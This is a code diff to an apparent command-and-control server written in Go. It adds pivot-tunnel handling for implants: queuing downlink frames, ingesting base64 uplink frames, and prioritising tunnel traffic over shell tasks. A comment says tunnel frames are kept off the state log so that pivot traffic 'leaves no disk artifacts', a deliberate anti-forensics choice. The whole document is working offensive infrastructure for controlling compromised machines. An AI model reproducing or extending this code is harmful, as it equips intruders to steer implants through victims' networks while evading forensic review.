@@ -9,6 +9,7 @@ package c2
 
 import (
 	"crypto/rand"
+	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
@@ -161,6 +162,9 @@ type Manager struct {
 	nextTaskID   int64
 	consoleToken string
 
+	tunPending map[string][]*Task // ephemeral tunnel frames, not persisted
+	tun        *TunnelManager
+
 	fallbackSecret string // optional global beacon secret (ARTEX_C2_SECRET)
 }
 
@@ -185,6 +189,7 @@ func NewManager(dir string) (*Manager, error) {
 		dir:            dir,
 		implants:       map[string]*Implant{},
 		tasks:          map[int64]*Task{},
+		tunPending:     map[string][]*Task{},
 		nextTaskID:     1,
 		fallbackSecret: strings.TrimSpace(os.Getenv("ARTEX_C2_SECRET")),
 	}
@@ -199,6 +204,7 @@ func NewManager(dir string) (*Manager, error) {
 		m.logSize = fi.Size()
 	}
 	m.logFile = f
+	m.tun = newTunnelManager(m.enqueueTunnel)
 	return m, nil
 }
 
@@ -593,16 +599,87 @@ func (m *Manager) AddTask(implantID, cmd, args string, timeoutSeconds int) (*Tas
 	m.tasks[t.ID] = t
 	if cmd == CmdKill {
 		im.Killed = true
+		delete(m.tunPending, implantID)
 		m.appendEvent(&event{Ev: "implant", Implant: im})
 	}
 	m.appendEvent(&event{Ev: "task", Task: t})
 	return t, nil
 }
 
+// enqueueTunnel queues one downlink tunnel frame for an implant. Frames are
+// ephemeral — they are not written to the state log, so pivot traffic leaves
+// no disk artifacts; task ID 0 tells the implant no result is expected.
+func (m *Manager) enqueueTunnel(implantID, frame string) error {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	im, ok := m.implants[implantID]
+	if !ok || im.Killed {
+		return fmt.Errorf("c2: unknown or killed implant %s", implantID)
+	}
+	q := m.tunPending[implantID]
+	if len(q) >= tunnelMaxPending {
+		return fmt.Errorf("c2: tunnel queue full for %s", implantID)
+	}
+	m.tunPending[implantID] = append(q, &Task{
+		ImplantID: implantID,
+		Cmd:       CmdTunnel,
+		Args:      frame,
+		Status:    "sent",
+		CreatedAt: time.Now().UTC(),
+	})
+	return nil
+}
+
+// IngestTunnelFrames applies uplink frames an implant posted to the result
+// endpoint (output = base64 of newline-separated frames). Frames for unknown
+// or foreign tunnels are ignored, so a spoofed batch is harmless.
+func (m *Manager) IngestTunnelFrames(implantID, output string) error {
+	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(output))
+	if err != nil {
+		raw = []byte(output) // tolerate an unencoded body
+	}
+	frames := parseFrames(string(raw))
+	if len(frames) == 0 {
+		return fmt.Errorf("c2: no valid tunnel frames")
+	}
+	for _, f := range frames {
+		f := f
+		m.tun.withTunnel(f.TunnelID, func(t *Tunnel) {
+			if t.ImplantID != implantID {
+				return
+			}
+			t.ingest(m.tun, f)
+		})
+	}
+	return nil
+}
+
+// TunnelCount returns the number of live tunnels for an implant ("" = all).
+func (m *Manager) TunnelCount(implantID string) int {
+	n := 0
+	for _, t := range m.tun.ListTunnels() {
+		if implantID == "" || t.ImplantID == implantID {
+			n++
+		}
+	}
+	return n
+}
+
 // Dequeue pops the oldest pending task for an implant and marks it sent.
+// Tunnel frames (ephemeral, ID 0) are served before persisted tasks so pivot
+// latency never depends on queued shell work.
 func (m *Manager) Dequeue(implantID string) (*Task, bool) {
 	m.mu.Lock()
 	defer m.mu.Unlock()
+	if q := m.tunPending[implantID]; len(q) > 0 {
+		t := q[0]
+		if len(q) == 1 {
+			delete(m.tunPending, implantID)
+		} else {
+			m.tunPending[implantID] = q[1:]
+		}
+		return t, true
+	}
 	ids := make([]int64, 0, len(m.tasks))
 	for id, t := range m.tasks {
 		if t.ImplantID == implantID && t.Status == "pending" {
